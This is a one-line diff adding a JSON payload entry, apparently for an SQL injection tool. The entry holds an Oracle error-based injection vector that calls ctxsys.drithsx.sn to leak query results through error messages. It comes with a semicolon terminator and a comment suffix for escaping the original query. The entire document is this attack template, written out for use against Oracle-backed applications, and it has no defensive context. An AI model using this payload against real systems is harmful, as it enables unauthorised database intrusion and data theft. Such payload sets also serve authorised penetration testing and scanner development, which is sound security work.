@@ -1,0 +1,1 @@
+{"dbms": "oracle", "technique": "error", "boundary": {"prefix": ";", "suffix": "-- -", "type": "semicolon"}, "vector": "{B} AND 1=ctxsys.drithsx.sn(1,({Q}))", "comment": "oracle error: terminator"}
